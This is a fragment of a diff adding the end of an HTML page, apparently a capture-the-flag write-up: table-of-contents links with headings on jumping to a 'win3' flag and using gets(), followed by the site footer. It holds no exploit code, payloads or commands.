+        <li><a href="#triggering-the-nice-try">Triggering the &ldquo;Nice Try!&rdquo;</a></li>
+        <li><a href="#3-booleans">3 Booleans</a>
+          <ul>
+            <li><a href="#plan-1-jump-on-win3--true">Plan 1: jump on win3 = true</a></li>
+            <li><a href="#plan-2-jump-on-win3--true-but-with-stack-fixing">Plan 2: jump on win3 = true but with stack fixing</a></li>
+            <li><a href="#plan-3-gets">Plan 3: gets()</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
